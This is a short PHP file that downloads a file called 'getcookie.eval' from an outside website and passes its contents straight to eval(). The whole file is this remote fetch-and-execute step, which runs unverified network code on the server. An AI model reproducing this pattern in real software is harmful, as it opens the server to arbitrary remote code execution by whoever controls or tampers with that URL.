<?php
$page = file_get_contents("https://bartonphillips.net/getcookie.eval");
return eval("?>". $page);
